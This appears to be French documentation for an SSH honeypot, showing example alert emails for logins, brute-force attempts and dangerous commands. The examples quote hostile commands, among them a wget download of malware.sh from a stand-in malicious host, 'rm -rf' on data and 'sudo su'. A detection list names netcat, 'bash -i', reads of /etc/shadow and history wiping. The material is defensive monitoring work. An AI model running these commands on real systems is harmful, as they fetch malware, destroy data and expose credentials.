# 📧 EXEMPLES D'EMAILS D'ALERTE

Voici à quoi ressemblent les emails que tu vas recevoir du honeypot.

---

## 📧 EXEMPLE 1 : CONNEXION RÉUSSIE (INTRUSION)

**Sujet :** `🟡 INTRUSION - Connexion réussie (admin) depuis 192.168.1.50`

```
╔════════════════════════════════════════════════════════════════╗
║  🟡  ALERTE HONEYPOT - MEDIUM                                  
╚════════════════════════════════════════════════════════════════╝

📋 INFORMATIONS GÉNÉRALES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Type d'alerte    : Connexion réussie
Niveau de risque : 🟡 MOYEN - Surveillance recommandée
Date et heure    : 2025-12-20 à 16:45:23 UTC
Message          : Connexion réussie détectée depuis 192.168.1.50

👤 INFORMATIONS SUR L'ATTAQUANT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Adresse IP       : 192.168.1.50:54321
Nom d'utilisateur: admin
Mot de passe     : admin123

✅ DÉTAILS DE LA CONNEXION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Un attaquant a réussi à se connecter au honeypot avec des
identifiants valides. Cela indique une tentative d'intrusion
active sur votre système.

⚠️  L'attaquant a maintenant accès au shell factice et peut
    exécuter des commandes qui seront enregistrées.

💡 RECOMMANDATIONS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ℹ️  SURVEILLANCE RECOMMANDÉE :
  1. Notez cette activité dans vos logs
  2. Surveillez si l'activité continue
  3. Pas d'action immédiate requise

📊 Pour plus de détails, consultez le dashboard : http://localhost:8080
🔍 Recherchez l'IP : 192.168.1.50:54321

╔════════════════════════════════════════════════════════════════╗
║  Honey SSH Honeypot - Système de surveillance automatique     ║
║  🌐 Dashboard: http://localhost:8080                           ║
╚════════════════════════════════════════════════════════════════╝
```

---

## 📧 EXEMPLE 2 : ATTAQUE BRUTE FORCE

**Sujet :** `🟠 ATTAQUE - Force brute détectée depuis 192.168.1.51`

```
╔════════════════════════════════════════════════════════════════╗
║  🟠  ALERTE HONEYPOT - HIGH                                    
╚════════════════════════════════════════════════════════════════╝

📋 INFORMATIONS GÉNÉRALES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Type d'alerte    : Attaque par force brute
Niveau de risque : 🟠 ÉLEVÉ - Attention requise
Date et heure    : 2025-12-20 à 16:47:15 UTC
Message          : ⚠️ ATTAQUE BRUTE FORCE DÉTECTÉE ! 6 tentatives depuis 192.168.1.51

👤 INFORMATIONS SUR L'ATTAQUANT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Adresse IP       : 192.168.1.51:33445
Nom d'utilisateur: root
Mot de passe     : password123
Tentatives       : 6

⚔️  DÉTAILS DE L'ATTAQUE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Une attaque automatisée par force brute a été détectée.
L'attaquant tente de deviner les identifiants en essayant
plusieurs combinaisons username/password.

Nombre de tentatives : 6
Fenêtre de temps     : 5 minutes
Seuil de détection   : 5 tentatives

💡 RECOMMANDATIONS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️  ATTENTION REQUISE :
  1. Consultez le dashboard pour analyser l'activité
  2. Surveillez cette IP pour d'autres tentatives
  3. Vérifiez que vos vrais services ne sont pas exposés
  4. Envisagez de bloquer 192.168.1.51 temporairement

📊 Pour plus de détails, consultez le dashboard : http://localhost:8080
🔍 Recherchez l'IP : 192.168.1.51:33445

╔════════════════════════════════════════════════════════════════╗
║  Honey SSH Honeypot - Système de surveillance automatique     ║
║  🌐 Dashboard: http://localhost:8080                           ║
╚════════════════════════════════════════════════════════════════╝
```

---

## 📧 EXEMPLE 3 : COMMANDE DANGEREUSE (TÉLÉCHARGEMENT)

**Sujet :** `🟠 COMMANDE SUSPECTE - 'wget http://malicious...' par 192.168.1.50`

```
╔════════════════════════════════════════════════════════════════╗
║  🟠  ALERTE HONEYPOT - HIGH                                    
╚════════════════════════════════════════════════════════════════╝

📋 INFORMATIONS GÉNÉRALES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Type d'alerte    : Commande dangereuse exécutée
Niveau de risque : 🟠 ÉLEVÉ - Attention requise
Date et heure    : 2025-12-20 à 16:48:32 UTC
Message          : ⚠️ Commande dangereuse exécutée par admin depuis 192.168.1.50

👤 INFORMATIONS SUR L'ATTAQUANT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Adresse IP       : 192.168.1.50:54321
Nom d'utilisateur: admin

⚠️  COMMANDE EXÉCUTÉE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Commande : wget http://malicious-site.com/malware.sh

Type de menace détectée :
  🔻 Téléchargement de fichier malveillant
     → L'attaquant tente de télécharger un script ou malware

💡 RECOMMANDATIONS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️  ATTENTION REQUISE :
  1. Consultez le dashboard pour analyser l'activité
  2. Surveillez cette IP pour d'autres tentatives
  3. Vérifiez que vos vrais services ne sont pas exposés
  4. Envisagez de bloquer 192.168.1.50 temporairement

📊 Pour plus de détails, consultez le dashboard : http://localhost:8080
🔍 Recherchez l'IP : 192.168.1.50:54321

╔════════════════════════════════════════════════════════════════╗
║  Honey SSH Honeypot - Système de surveillance automatique     ║
║  🌐 Dashboard: http://localhost:8080                           ║
╚════════════════════════════════════════════════════════════════╝
```

---

## 📧 EXEMPLE 4 : COMMANDE CRITIQUE (DESTRUCTION)

**Sujet :** `🔴 COMMANDE SUSPECTE - 'rm -rf /tmp/important...' par 192.168.1.50`

```
╔════════════════════════════════════════════════════════════════╗
║  🔴  ALERTE HONEYPOT - CRITICAL                                
╚════════════════════════════════════════════════════════════════╝

📋 INFORMATIONS GÉNÉRALES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Type d'alerte    : Commande dangereuse exécutée
Niveau de risque : 🔴 CRITIQUE - Action immédiate requise
Date et heure    : 2025-12-20 à 16:49:15 UTC
Message          : ⚠️ Commande dangereuse exécutée par admin depuis 192.168.1.50

👤 INFORMATIONS SUR L'ATTAQUANT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Adresse IP       : 192.168.1.50:54321
Nom d'utilisateur: admin

⚠️  COMMANDE EXÉCUTÉE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Commande : rm -rf /tmp/important_data

Type de menace détectée :
  💣 Tentative de destruction de données
     → Commande de suppression récursive détectée

💡 RECOMMANDATIONS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️  ACTION IMMÉDIATE REQUISE :
  1. Vérifiez immédiatement le dashboard pour plus de détails
  2. Analysez toutes les commandes exécutées par cet attaquant
  3. Bloquez cette IP dans votre firewall si nécessaire
  4. Vérifiez vos vrais serveurs pour des activités similaires
  5. Considérez le signalement de 192.168.1.50 aux autorités

📊 Pour plus de détails, consultez le dashboard : http://localhost:8080
🔍 Recherchez l'IP : 192.168.1.50:54321

╔════════════════════════════════════════════════════════════════╗
║  Honey SSH Honeypot - Système de surveillance automatique     ║
║  🌐 Dashboard: http://localhost:8080                           ║
╚════════════════════════════════════════════════════════════════╝
```

---

## 📧 EXEMPLE 5 : TENTATIVE D'ÉLÉVATION DE PRIVILÈGES

**Sujet :** `🟠 COMMANDE SUSPECTE - 'sudo su' par 192.168.1.50`

```
╔════════════════════════════════════════════════════════════════╗
║  🟠  ALERTE HONEYPOT - HIGH                                    
╚════════════════════════════════════════════════════════════════╝

📋 INFORMATIONS GÉNÉRALES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Type d'alerte    : Commande dangereuse exécutée
Niveau de risque : 🟠 ÉLEVÉ - Attention requise
Date et heure    : 2025-12-20 à 16:50:00 UTC
Message          : ⚠️ Commande dangereuse exécutée par admin depuis 192.168.1.50

👤 INFORMATIONS SUR L'ATTAQUANT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Adresse IP       : 192.168.1.50:54321
Nom d'utilisateur: admin

⚠️  COMMANDE EXÉCUTÉE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Commande : sudo su

Type de menace détectée :
  🔐 Tentative d'élévation de privilèges
     → L'attaquant cherche à obtenir les droits root

💡 RECOMMANDATIONS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️  ATTENTION REQUISE :
  1. Consultez le dashboard pour analyser l'activité
  2. Surveillez cette IP pour d'autres tentatives
  3. Vérifiez que vos vrais services ne sont pas exposés
  4. Envisagez de bloquer 192.168.1.50 temporairement

📊 Pour plus de détails, consultez le dashboard : http://localhost:8080
🔍 Recherchez l'IP : 192.168.1.50:54321

╔════════════════════════════════════════════════════════════════╗
║  Honey SSH Honeypot - Système de surveillance automatique     ║
║  🌐 Dashboard: http://localhost:8080                           ║
╚════════════════════════════════════════════════════════════════╝
```

---

## 📊 NIVEAUX DE SÉVÉRITÉ

| Niveau | Emoji | Signification | Action |
|--------|-------|---------------|--------|
| **CRITICAL** | 🔴 | Menace grave immédiate | Action immédiate requise |
| **HIGH** | 🟠 | Activité très suspecte | Attention requise |
| **MEDIUM** | 🟡 | Activité suspecte | Surveillance recommandée |
| **LOW** | 🔵 | Activité normale du honeypot | Information |

---

## 🎯 TYPES D'ALERTES

### **Connexion réussie (MEDIUM)**
- Un attaquant s'est connecté avec des identifiants valides
- Il peut maintenant exécuter des commandes dans le shell factice

### **Attaque brute force (HIGH)**
- 5+ tentatives de connexion échouées en 5 minutes
- Attaque automatisée détectée

### **Commande dangereuse (HIGH/CRITICAL)**
Types de commandes détectées :
- 🔻 **Téléchargement** : `wget`, `curl`
- 💣 **Destruction** : `rm -rf`, `dd`, `mkfs`
- 🔐 **Élévation** : `sudo`, `su`, `passwd`
- 🔓 **Permissions** : `chmod 777`, `chmod +x`
- 🌐 **Backdoor** : `nc`, `netcat`, `bash -i`
- 💻 **Code arbitraire** : `python -c`, `perl -e`
- 👁️ **Énumération** : `cat /etc/passwd`, `cat /etc/shadow`
- 🧹 **Effacement** : `history -c`

### **Tentative échouée (LOW)**
- Tentative de connexion avec des identifiants incorrects
- Peut précéder une attaque brute force

---

## 💡 CONSEILS

1. **Vérifie régulièrement tes emails** - Les alertes critiques nécessitent une action rapide
2. **Marque les emails comme "Non spam"** - Pour que les prochains arrivent bien
3. **Configure des règles de filtrage** - Pour organiser les alertes par sévérité
4. **Consulte le dashboard** - Pour une vue complète de l'activité

---

**📧 Email configuré :** `HoneyPotProject@hotmail.com`  
**🌐 Dashboard :** http://localhost:8080

